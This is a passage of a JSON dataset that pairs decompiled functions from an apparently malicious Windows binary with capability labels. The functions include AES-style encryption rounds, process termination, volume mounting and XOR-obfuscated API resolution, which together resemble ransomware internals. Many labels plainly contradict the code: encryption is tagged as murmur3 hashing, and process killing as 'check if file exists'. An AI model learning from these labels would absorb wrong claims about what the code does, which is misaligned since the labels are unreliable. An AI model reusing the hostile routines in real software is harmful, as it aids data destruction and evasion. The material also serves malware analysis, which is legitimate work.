str.cw[*(arg_8h + 0x97)]), str.cw[*(arg_8h + 0x96)]), \n                         str.cw[*(arg_8h + 0x95)]) ^ uVar4 ^ 0x1b;\n        arg_8h[0x26] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x27] = uVar1;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x29] = uVar3;\n        arg_8h[0x28] = uVar2;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0xa7)]), str.cw[*(arg_8h + 0xa6)]), \n                         str.cw[*(arg_8h + 0xa5)]) ^ uVar4 ^ 0x36;\n        uVar1 = uVar1 ^ uVar4;\n        arg_8h[0x2a] = uVar4;\n        arg_8h[0x2b] = uVar1;\n        uVar1 = uVar1 ^ uVar2;\n        arg_8h[0x2c] = uVar1;\n        arg_8h[0x2d] = uVar1 ^ uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 2064
    },
    "00406890": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406890(int32_t *arg_8h, uint32_t *arg_ch, uchar *arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h[1];\n    uVar2 = arg_ch[1] ^ puVar1[1];\n    uVar8 = *arg_ch ^ *puVar1;\n    uVar9 = arg_ch[2] ^ puVar1[2];\n    uVar4 = arg_ch[3] ^ puVar1[3];\n    puVar1 = puVar1 + 4;\n    iVar3 = *arg_8h >> 1;\n    while (iVar3 = iVar3 + -1,  0 < iVar3) {\n        uVar5 = *((uVar4 >> 8 & 0xff) * 4 + 0x421c40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x422040) ^\n                *((uVar2 >> 0x18) * 4 + 0x422440) ^ *((uVar8 & 0xff) * 4 + 0x421840) ^ *puVar1;\n        uVar6 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x422040) ^ *((uVar8 >> 8 & 0xff) * 4 + 0x421c40) ^\n                *((uVar9 >> 0x18) * 4 + 0x422440) ^ *((uVar2 & 0xff) * 4 + 0x421840) ^ puVar1[1];\n        uVar7 = *((uVar2 >> 8 & 0xff) * 4 + 0x421c40) ^ *((uVar8 >> 0x10 & 0xff) * 4 + 0x422040) ^\n                *((uVar4 >> 0x18) * 4 + 0x422440) ^ *((uVar9 & 0xff) * 4 + 0x421840) ^ puVar1[2];\n        uVar4 = *((uVar9 >> 8 & 0xff) * 4 + 0x421c40) ^ *((uVar2 >> 0x10 & 0xff) * 4 + 0x422040) ^\n                *((uVar8 >> 0x18) * 4 + 0x422440) ^ *((uVar4 & 0xff) * 4 + 0x421840) ^ puVar1[3];\n        uVar8 = *((uVar4 >> 8 & 0xff) * 4 + 0x421c40) ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x422040) ^\n                *((uVar6 >> 0x18) * 4 + 0x422440) ^ *((uVar5 & 0xff) * 4 + 0x421840) ^ puVar1[4];\n        uVar2 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x422040) ^ *((uVar5 >> 8 & 0xff) * 4 + 0x421c40) ^\n                *((uVar7 >> 0x18) * 4 + 0x422440) ^ *((uVar6 & 0xff) * 4 + 0x421840) ^ puVar1[5];\n        uVar9 = *((uVar6 >> 8 & 0xff) * 4 + 0x421c40) ^ *((uVar5 >> 0x10 & 0xff) * 4 + 0x422040) ^\n                *((uVar4 >> 0x18) * 4 + 0x422440) ^ *((uVar7 & 0xff) * 4 + 0x421840) ^ puVar1[6];\n        uVar4 = *((uVar7 >> 8 & 0xff) * 4 + 0x421c40) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x422040) ^\n                *((uVar5 >> 0x18) * 4 + 0x422440) ^ *((uVar4 & 0xff) * 4 + 0x421840) ^ puVar1[7];\n        puVar1 = puVar1 + 8;\n    }\n    uVar5 = *((uVar4 >> 8 & 0xff) * 4 + 0x421c40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x422040) ^\n            *((uVar2 >> 0x18) * 4 + 0x422440) ^ *((uVar8 & 0xff) * 4 + 0x421840) ^ *puVar1;\n    uVar6 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x422040) ^ *((uVar8 >> 8 & 0xff) * 4 + 0x421c40) ^\n            *((uVar9 >> 0x18) * 4 + 0x422440) ^ *((uVar2 & 0xff) * 4 + 0x421840) ^ puVar1[1];\n    uVar7 = *((uVar2 >> 8 & 0xff) * 4 + 0x421c40) ^ *((uVar8 >> 0x10 & 0xff) * 4 + 0x422040) ^\n            *((uVar4 >> 0x18) * 4 + 0x422440) ^ *((uVar9 & 0xff) * 4 + 0x421840) ^ puVar1[2];\n    uVar2 = *((uVar9 >> 8 & 0xff) * 4 + 0x421c40) ^ *((uVar2 >> 0x10 & 0xff) * 4 + 0x422040) ^\n            *((uVar8 >> 0x18) * 4 + 0x422440) ^ *((uVar4 & 0xff) * 4 + 0x421840) ^ puVar1[3];\n    uVar9 = CONCAT31(CONCAT21(CONCAT11(*((uVar6 >> 0x18) + 0x421740), *((uVar7 >> 0x10 & 0xff) + 0x421740)), \n                              *((uVar2 >> 8 & 0xff) + 0x421740)), *((uVar5 & 0xff) + 0x421740)) ^ puVar1[4];\n    uVar8 = CONCAT31(CONCAT21(CONCAT11(*((uVar7 >> 0x18) + 0x421740), *((uVar2 >> 0x10 & 0xff) + 0x421740)), \n                              *((uVar5 >> 8 & 0xff) + 0x421740)), *((uVar6 & 0xff) + 0x421740)) ^ puVar1[5];\n    uVar4 = CONCAT31(CONCAT21(CONCAT11(*((uVar2 >> 0x18) + 0x421740), *((uVar5 >> 0x10 & 0xff) + 0x421740)), \n                              *((uVar6 >> 8 & 0xff) + 0x421740)), *((uVar7 & 0xff) + 0x421740)) ^ puVar1[6];\n    uVar2 = CONCAT31(CONCAT21(CONCAT11(*((uVar5 >> 0x18) + 0x421740), *((uVar6 >> 0x10 & 0xff) + 0x421740)), \n                              *((uVar7 >> 8 & 0xff) + 0x421740)), *((uVar2 & 0xff) + 0x421740)) ^ puVar1[7];\n    *arg_10h = uVar9;\n    arg_10h[1] = uVar9 >> 8;\n    arg_10h[2] = uVar9 >> 0x10;\n    arg_10h[3] = uVar9 >> 0x18;\n    arg_10h[4] = uVar8;\n    arg_10h[5] = uVar8 >> 8;\n    arg_10h[6] = uVar8 >> 0x10;\n    arg_10h[7] = uVar8 >> 0x18;\n    arg_10h[9] = uVar4 >> 8;\n    arg_10h[10] = uVar4 >> 0x10;\n    arg_10h[0xd] = uVar2 >> 8;\n    arg_10h[8] = uVar4;\n    arg_10h[0xc] = uVar2;\n    arg_10h[0xb] = uVar4 >> 0x18;\n    arg_10h[0xe] = uVar2 >> 0x10;\n    arg_10h[0xf] = uVar2 >> 0x18;\n    return 0;\n}\n",
        "token_count": 2158
    },
    "00406e20": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406e20(int32_t *arg_8h, uint32_t *arg_ch, uchar *arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h[1];\n    uVar2 = arg_ch[1] ^ puVar1[1];\n    uVar3 = arg_ch[2] ^ puVar1[2];\n    uVar9 = *arg_ch ^ *puVar1;\n    uVar5 = arg_ch[3] ^ puVar1[3];\n    puVar1 = puVar1 + 4;\n    iVar4 = *arg_8h >> 1;\n    while (iVar4 = iVar4 + -1,  0 < iVar4) {\n        uVar6 = *((uVar3 >> 0x10 & 0xff) * 4 + 0x420f40) ^ *((uVar2 >> 8 & 0xff) * 4 + 0x420b40) ^\n                *((uVar5 >> 0x18) * 4 + 0x421340) ^ *((uVar9 & 0xff) * 4 + 0x420740) ^ *puVar1;\n        uVar7 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x420f40) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x420b40) ^\n                *((uVar9 >> 0x18) * 4 + 0x421340) ^ *((uVar2 & 0xff) * 4 + 0x420740) ^ puVar1[1];\n        uVar8 = *((uVar5 >> 8 & 0xff) * 4 + 0x420b40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x420f40) ^\n                *((uVar2 >> 0x18) * 4 + 0x421340) ^ *((uVar3 & 0xff) * 4 + 0x420740) ^ puVar1[2];\n        uVar5 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x420f40) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x420b40) ^\n                *((uVar3 >> 0x18) * 4 + 0x421340) ^ *((uVar5 & 0xff) * 4 + 0x420740) ^ puVar1[3];\n        uVar9 = *((uVar8 >> 0x10 & 0xff) * 4 + 0x420f40) ^ *((uVar7 >> 8 & 0xff) * 4 + 0x420b40) ^\n                *((uVar5 >> 0x18) * 4 + 0x421340) ^ *((uVar6 & 0xff) * 4 + 0x420740) ^ puVar1[4];\n        uVar2 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x420f40) ^ *((uVar8 >> 8 & 0xff) * 4 + 0x420b40) ^\n                *((uVar6 >> 0x18) * 4 + 0x421340) ^ *((uVar7 & 0xff) * 4 + 0x420740) ^ puVar1[5];\n        uVar3 = *((uVar5 >> 8 & 0xff) * 4 + 0x420b40) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x420f40) ^\n                *((uVar7 >> 0x18) * 4 + 0x421340) ^ *((uVar8 & 0xff) * 4 + 0x420740) ^ puVar1[6];\n        uVar5 = *((uVar7 >> 0x10 & 0xff) * 4 + 0x420f40) ^ *((uVar6 >> 8 & 0xff) * 4 + 0x420b40) ^\n                *((uVar8 >> 0x18) * 4 + 0x421340) ^ *((uVar5 & 0xff) * 4 + 0x420740) ^ puVar1[7];\n        puVar1 = puVar1 + 8;\n    }\n    uVar6 = *((uVar3 >> 0x10 & 0xff) * 4 + 0x420f40) ^ *((uVar2 >> 8 & 0xff) * 4 + 0x420b40) ^\n            *((uVar5 >> 0x18) * 4 + 0x421340) ^ *((uVar9 & 0xff) * 4 + 0x420740) ^ *puVar1;\n    uVar7 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x420f40) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x420b40) ^\n            *((uVar9 >> 0x18) * 4 + 0x421340) ^ *((uVar2 & 0xff) * 4 + 0x420740) ^ puVar1[1];\n    uVar8 = *((uVar5 >> 8 & 0xff) * 4 + 0x420b40) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x420f40) ^\n            *((uVar2 >> 0x18) * 4 + 0x421340) ^ *((uVar3 & 0xff) * 4 + 0x420740) ^ puVar1[2];\n    uVar2 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x420f40) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x420b40) ^\n            *((uVar3 >> 0x18) * 4 + 0x421340) ^ *((uVar5 & 0xff) * 4 + 0x420740) ^ puVar1[3];\n    uVar9 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar2 >> 0x18], str.cw[uVar8 >> 0x10 & 0xff]), str.cw[uVar7 >> 8 & 0xff])\n                     , str.cw[uVar6 & 0xff]) ^ puVar1[4];\n    uVar3 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar6 >> 0x18], str.cw[uVar2 >> 0x10 & 0xff]), str.cw[uVar8 >> 8 & 0xff])\n                     , str.cw[uVar7 & 0xff]) ^ puVar1[5];\n    uVar5 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar7 >> 0x18], str.cw[uVar6 >> 0x10 & 0xff]), str.cw[uVar2 >> 8 & 0xff])\n                     , str.cw[uVar8 & 0xff]) ^ puVar1[6];\n    uVar2 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar8 >> 0x18], str.cw[uVar7 >> 0x10 & 0xff]), str.cw[uVar6 >> 8 & 0xff])\n                     , str.cw[uVar2 & 0xff]) ^ puVar1[7];\n    *arg_10h = uVar9;\n    arg_10h[1] = uVar9 >> 8;\n    arg_10h[2] = uVar9 >> 0x10;\n    arg_10h[3] = uVar9 >> 0x18;\n    arg_10h[4] = uVar3;\n    arg_10h[5] = uVar3 >> 8;\n    arg_10h[6] = uVar3 >> 0x10;\n    arg_10h[7] = uVar3 >> 0x18;\n    arg_10h[9] = uVar5 >> 8;\n    arg_10h[10] = uVar5 >> 0x10;\n    arg_10h[0xd] = uVar2 >> 8;\n    arg_10h[8] = uVar5;\n    arg_10h[0xc] = uVar2;\n    arg_10h[0xb] = uVar5 >> 0x18;\n    arg_10h[0xe] = uVar2 >> 0x10;\n    arg_10h[0xf] = uVar2 >> 0x18;\n    return 0;\n}\n",
        "token_count": 2087
    },
    "004048c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004048c0(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    if ((arg_ch != NULL) && (arg_ch = arg_8h + arg_ch + -1,  arg_8h <= arg_ch)) {\n        do {\n            uVar5 = *arg_8h;\n            uVar7 = 0;\n            cVar1 = '\\0';\n            iVar6 = 4;\n            do {\n                iVar8 = iVar6;\n                uVar4 = uVar5 & 0xff;\n                uVar3 = 0x18 - cVar1;\n                uVar5 = uVar5 >> 8;\n                cVar1 = cVar1 + '\\b';\n                uVar7 = uVar7 | uVar4 << (uVar3 & 0x1f);\n                iVar6 = iVar8 + -1;\n            } while (iVar6 != 0);\n            uVar4 = 0;\n            iVar8 = iVar8 + 3;\n            uVar5 = *arg_ch;\n            do {\n                uVar2 = uVar5 & 0xff;\n                cVar1 = iVar6;\n                uVar5 = uVar5 >> 8;\n                iVar6 = iVar6 + 8;\n                uVar4 = uVar4 | uVar2 << (0x18U - cVar1 & 0x1f);\n                iVar8 = iVar8 + -1;\n            } while (iVar8 != 0);\n            *arg_8h = uVar4;\n            arg_8h = arg_8h + 1;\n            *arg_ch = uVar7;\n            arg_ch = arg_ch + -1;\n        } while (arg_8h <= arg_ch);\n    }\n    return;\n}\n",
        "token_count": 456
    },
    "00404410": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404410(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    int8_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    uVar6 = arg_ch >> 5;\n    iVar3 = fcn.00401f60(arg_8h);\n    uVar4 = iVar3 + arg_ch;\n    uVar5 = *(arg_8h + 4);\n    if (uVar5 << 5 < uVar4) {\n        uVar4 = ((uVar4 & 0x1f) != 0) + (uVar4 >> 5);\n        if (10000 < uVar4) {\n            return 0xfffffff0;\n        }\n        if (uVar5 < uVar4) {\n            iVar3 = sub.msvcrt.dll_calloc(uVar4, 4);\n            if (iVar3 == 0) {\n                return 0xfffffff0;\n            }\n            if (*(arg_8h + 8) != 0) {\n                fcn.0040cbe0(iVar3, *(arg_8h + 8), *(arg_8h + 4) << 2);\n                fcn.00408120(*(arg_8h + 8), *(arg_8h + 4) << 2);\n                sub.msvcrt.dll_free(*(arg_8h + 8));\n            }\n            *(arg_8h + 4) = uVar4;\n            *(arg_8h + 8) = iVar3;\n            uVar5 = uVar4;\n        }\n    }\n    if (uVar6 != 0) {\n        if (uVar6 < uVar5) {\n            iVar3 = (uVar5 - uVar6) * 4;\n            do {\n                iVar3 = iVar3 + -4;\n                *(*(arg_8h + 8) + -4 + uVar5 * 4) = *(iVar3 + *(arg_8h + 8));\n                uVar5 = uVar5 - 1;\n            } while (uVar6 < uVar5);\n        }\n        for (; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *(*(arg_8h + 8) + -4 + uVar5 * 4) = 0;\n        }\n    }\n    if (((arg_ch & 0x1f) != 0) && (uVar6 < *(arg_8h + 4))) {\n        iVar2 = arg_ch & 0x1f;\n        do {\n            uVar5 = *(*(arg_8h + 8) + uVar6 * 4);\n            *(*(arg_8h + 8) + uVar6 * 4) = uVar5 << iVar2;\n            puVar1 = *(arg_8h + 8) + uVar6 * 4;\n            *puVar1 = *puVar1 | var_4h;\n            uVar6 = uVar6 + 1;\n            var_4h = uVar5 >> (0x20U - iVar2 & 0x1f);\n        } while (uVar6 < *(arg_8h + 4));\n    }\n    return 0;\n}\n",
        "token_count": 763
    },
    "00404550": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404550(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    uVar6 = *(arg_8h + 4);\n    uVar2 = arg_ch & 0x1f;\n    arg_ch = arg_ch >> 5;\n    if ((arg_ch <= uVar6) && ((arg_ch != uVar6 || (uVar2 == 0)))) {\n        if (arg_ch != 0) {\n            uVar3 = 0;\n            if (uVar6 != arg_ch) {\n                iVar5 = arg_ch * 4;\n                do {\n                    *(*(arg_8h + 8) + uVar3 * 4) = *(iVar5 + *(arg_8h + 8));\n                    uVar3 = uVar3 + 1;\n                    uVar6 = *(arg_8h + 4);\n                    iVar5 = iVar5 + 4;\n                } while (uVar3 < uVar6 - arg_ch);\n            }\n            if (uVar3 < uVar6) {\n                do {\n                    *(*(arg_8h + 8) + uVar3 * 4) = 0;\n                    uVar3 = uVar3 + 1;\n                    uVar6 = *(arg_8h + 4);\n                } while (uVar3 < uVar6);\n            }\n        }\n        if ((uVar2 != 0) && (uVar6 != 0)) {\n            do {\n                uVar3 = *(*(arg_8h + 8) + -4 + uVar6 * 4);\n                *(*(arg_8h + 8) + uVar6 * 4 + -4) = uVar3 >> uVar2;\n                puVar1 = *(arg_8h + 8) + -4 + uVar6 * 4;\n                *puVar1 = *puVar1 | var_4h;\n                var_4h = uVar3 << (0x20U - uVar2 & 0x1f);\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        return 0;\n    }\n    uVar4 = fcn.00403e10(arg_8h, 0);\n    return uVar4;\n}\n",
        "token_count": 570
    },
    "0041a160": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041a160(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint var_128h;\n    uint var_124h;\n    int32_t var_110h;\n    \n    fcn.0040cc00(&var_124h, 0, 0x124);\n    var_128h = 0x128;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32First)(iVar1, &var_128h);\n        while (iVar2 != 0) {\n            if (((var_110h == param_1) && (iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(),  var_110h != iVar2))\n               && (iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 1, var_110h), \n                  pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle,  iVar2 != 0)) {\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar2, 1);\n                pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32Next)(iVar1, &var_128h);\n        }\n        (*pcVar4)(iVar1);\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    if ((param_1 != iVar1) && (iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 1, param_1),  iVar1 != 0)) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, 1);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 488
    },
    "0041ba80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041ba80(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint lpszVolumeMountPoint;\n    uint8_t var_1ah;\n    uint8_t var_19h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_6h;\n    uchar var_2h;\n    \n    pcVar1 = _sym.imp.USER32.dll_wsprintfW;\n    iVar4 = 0x19;\n    do {\n        var_ch._0_1_ = *0x423faa;\n        var_18h._0_1_ = 0x23;\n        var_18h._1_1_ = 0;\n        var_18h._2_1_ = 0x25;\n        var_18h._3_1_ = 0;\n        var_14h._0_1_ = 0x43;\n        var_14h._1_1_ = 0;\n        var_14h._2_1_ = 0x3a;\n        var_14h._3_1_ = 0;\n        var_10h._0_1_ = 0x5c;\n        var_10h._1_1_ = 0;\n        var_10h._2_1_ = 0;\n        var_10h._3_1_ = 0;\n        var_ch._1_1_ = var_ch >> 7;\n        stack0xfffffff2 = CONCAT22(str.Volume__S_mounted_to__S._2_2_, str.Volume__S_mounted_to__S._0_2_);\n        var_6h = str.Volume__S_mounted_to__S._4_2_;\n        (*pcVar1)(&lpszVolumeMountPoint, &var_18h + 2, iVar4 + 0x41);\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetVolumeMountPointW)(&lpszVolumeMountPoint, param_1);\n        if (iVar2 != 0) {\n            uVar3 = 0;\n            var_1ah = *0x4246d0;\n            var_19h = *0x4246d0 >> 8;\n            var_18h._0_1_ = *0x4246d0 >> 0x10;\n            var_18h._1_1_ = *0x4246d0 >> 0x18;\n            var_18h._2_1_ = *0x4246d4;\n            var_18h._3_1_ = *0x4246d4 >> 8;\n            var_14h._0_1_ = *0x4246d4 >> 0x10;\n            var_14h._1_1_ = *0x4246d4 >> 0x18;\n            var_14h._2_1_ = *0x4246d8;\n            var_14h._3_1_ = *0x4246d8 >> 8;\n            var_10h._0_1_ = *0x4246d8 >> 0x10;\n            var_10h._1_1_ = *0x4246d8 >> 0x18;\n            var_10h._2_1_ = *0x4246dc;\n            var_10h._3_1_ = *0x4246dc >> 8;\n            var_ch._0_1_ = *0x4246dc >> 0x10;\n            var_ch._1_1_ = *0x4246dc >> 0x18;\n            stack0xfffffff2 = 0x26723637;\n            var_6h = 0x177723d;\n            do {\n                (&var_19h)[uVar3] = (&var_19h)[uVar3] ^ var_1ah;\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < 0x17);\n            var_2h = 0;\n            fcn.0040a0b0(&var_19h, param_1);\n            return;\n        }\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != -1);\n    return;\n}\n",
        "token_count": 976
    },
    "0041bea0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041bea0(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e4h;\n    uint var_dch;\n    uint var_d4h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_bch;\n    uint var_ach;\n    uint var_a8h;\n    uint var_9bh;\n    uint uStack155;\n    uint uStack151;\n    uint uStack147;\n    uint var_8bh;\n    int16_t var_86h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    ushort var_68h;\n    uint var_66h;\n    uint16_t var_62h;\n    uint16_t var_60h;\n    uint16_t var_5eh;\n    uint16_t var_5ch;\n    uint16_t var_5ah;\n    uint16_t var_58h;\n    uint16_t var_56h;\n    uint16_t var_54h;\n    uint16_t var_52h;\n    uint16_t var_50h;\n    uint16_t var_4eh;\n    uint16_t var_4ch;\n    uint16_t var_4ah;\n    ushort var_48h;\n    uint var_46h;\n    uint uStack70;\n    uint uStack66;\n    uint uStack62;\n    uint var_36h;\n    uint var_32h;\n    uint32_t var_2eh;\n    uint var_28h;\n    uint hToken;\n    uint hExistingToken;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint16_t var_10h;\n    uint var_eh;\n    uint var_ah;\n    uint var_6h;\n    uint var_2h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    uVar7 = 0;\n    var_9bh = *0x424b10;\n    uStack155 = *0x424b14;\n    uStack151 = *0x424b18;\n    uStack147 = *0x424b1c;\n    var_8bh._0_2_ = 0x5358;\n    do {\n        puVar1 = &var_9bh + uVar7 + 1;\n        *puVar1 = *puVar1 ^ *0x424b10;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x11);\n    var_8bh._2_1_ = 0;\n    var_eh = 0x67604314;\n    uVar7 = 0;\n    var_ah = 0x277d6475;\n    var_6h = 0x78703a26;\n    var_2h._0_2_ = 0x78;\n    do {\n        puVar1 = &var_eh + uVar7 + 1;\n        *puVar1 = *puVar1 ^ 0x14;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0xc);\n    var_2h._0_2_ = var_2h & 0xff;\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&var_eh + 1, &var_9bh + 1);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    var_46h = *0x424540;\n    uStack70 = *0x424544;\n    uStack66 = *0x424548;\n    uStack62 = *0x42454c;\n    var_36h = 0x1080b17;\n    uVar7 = 0;\n    var_32h = 0x17170137;\n    var_2eh._0_2_ = 0xb0d;\n    stack0xffffffd0 = 0x2d0a;\n    do {\n        puVar1 = &var_46h + uVar7 + 1;\n        *puVar1 = *puVar1 ^ *0x424540;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x1c);\n    stack0xffffffd0 = stack0xffffffd0 & 0xffffff;\n    var_1ch = 0xd0a297e;\n    uVar7 = 0;\n    var_18h = 0x4d170e1f;\n    var_14h = 0x121a504c;\n    var_10h = 0x12;\n    do {\n        puVar1 = &var_1ch + uVar7 + 1;\n        *puVar1 = *puVar1 ^ 0x7e;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0xc);\n    var_10h = var_10h & 0xff;\n    uVar3 = (*pcVar5)(&var_1ch + 1, &var_46h + 1);\n    pcVar5 = (*pcVar2)(uVar3);\n    if ((pcVar4 != NULL) && (pcVar5 != NULL)) {\n        var_f8h = 0x44;\n        var_66h._0_2_ = *0x42405c ^ 0x69;\n        var_66h._2_2_ = *0x42405e ^ 0x69;\n        _var_ech = 0;\n        var_62h = *0x424060 ^ 0x69;\n        _var_e4h = 0;\n        var_60h = *0x424062 ^ 0x69;\n        _var_dch = 0;\n        var_5eh = *0x424064 ^ 0x69;\n        _var_d4h = 0;\n        var_5ch = *0x424066 ^ 0x69;\n        _var_cch = 0;\n        var_5ah = str.ntdll._0_2_ ^ 0x69;\n        _var_c4h = 0;\n        var_58h = str.ntdll._2_2_ ^ 0x69;\n        _var_bch = 0;\n        var_56h = str.ntdll._4_2_ ^ 0x69;\n        stack0xffffff74 = 0x1e0069;\n        var_54h = *0x42406e ^ 0x69;\n        var_84h = 0x70000;\n        var_52h = str.RtlFreeUnicodeString._0_2_ ^ 0x69;\n        var_80h = 0x1d001a;\n        var_50h = str.RtlFreeUnicodeString._2_2_ ^ 0x69;\n        var_7ch = 0x590008;\n        var_4eh = str.RtlFreeUnicodeString._4_2_ ^ 0x69;\n        var_78h = 0xd0035;\n        var_4ch = str.RtlFreeUnicodeString._6_2_ ^ 0x69;\n        var_74h = 0xf000c;\n        var_4ah = str.RtlFreeUnicodeString._8_2_ ^ 0x69;\n        var_70h = 0x1c0008;\n        uVar7 = 0;\n        var_6ch = 0x1d0005;\n        var_68h = 0x69;\n        var_48h = 0;\n        do {\n            (&var_86h)[uVar7] = *(&var_86h + uVar7) ^ 0x69;\n            uVar7 = uVar7 + 1;\n        } while (uVar7 < 0x1f);\n        _var_f4h = 